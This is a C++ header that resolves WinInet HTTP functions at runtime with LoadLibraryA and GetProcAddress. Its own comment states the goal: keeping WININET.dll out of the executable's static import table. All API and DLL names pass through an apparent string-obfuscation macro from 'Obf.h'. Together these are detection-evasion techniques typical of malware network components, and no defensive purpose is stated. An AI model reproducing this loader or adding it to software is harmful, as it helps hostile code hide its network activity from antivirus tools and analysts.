#pragma once
// Dynamic WinInet loader — resolves all WinInet functions at runtime via GetProcAddress
// so WININET.dll does NOT appear in the PE static import table.
// Include this after common.h (which already pulls in WinInet.h for the type defs).
// C++17 inline variables: all TUs that include this header share a single instance.

#include "Obf.h"

typedef HINTERNET (WINAPI *fpInternetOpenA)     (LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
typedef HINTERNET (WINAPI *fpInternetConnectA)  (HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET (WINAPI *fpHttpOpenRequestA)  (HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
typedef BOOL      (WINAPI *fpHttpSendRequestA)  (HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
typedef BOOL      (WINAPI *fpInternetReadFile)  (HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL      (WINAPI *fpInternetCloseHandle)(HINTERNET);
typedef BOOL      (WINAPI *fpInternetSetOption) (HINTERNET, DWORD, LPVOID, DWORD);

inline fpInternetOpenA      g_InternetOpenA      = nullptr;
inline fpInternetConnectA   g_InternetConnectA   = nullptr;
inline fpHttpOpenRequestA   g_HttpOpenRequestA   = nullptr;
inline fpHttpSendRequestA   g_HttpSendRequestA   = nullptr;
inline fpInternetReadFile   g_InternetReadFile   = nullptr;
inline fpInternetCloseHandle g_InternetCloseHandle = nullptr;
inline fpInternetSetOption  g_InternetSetOption  = nullptr;

inline void InitWinInet() {
    if (g_InternetOpenA) return;
    std::string dll = S("wininet.dll");
    HMODULE h = LoadLibraryA(dll.c_str());
    if (!h) return;
    g_InternetOpenA      = (fpInternetOpenA)     GetProcAddress(h, S("InternetOpenA").c_str());
    g_InternetConnectA   = (fpInternetConnectA)  GetProcAddress(h, S("InternetConnectA").c_str());
    g_HttpOpenRequestA   = (fpHttpOpenRequestA)  GetProcAddress(h, S("HttpOpenRequestA").c_str());
    g_HttpSendRequestA   = (fpHttpSendRequestA)  GetProcAddress(h, S("HttpSendRequestA").c_str());
    g_InternetReadFile   = (fpInternetReadFile)  GetProcAddress(h, S("InternetReadFile").c_str());
    g_InternetCloseHandle= (fpInternetCloseHandle)GetProcAddress(h, S("InternetCloseHandle").c_str());
    g_InternetSetOption  = (fpInternetSetOption) GetProcAddress(h, S("InternetSetOption").c_str());
}
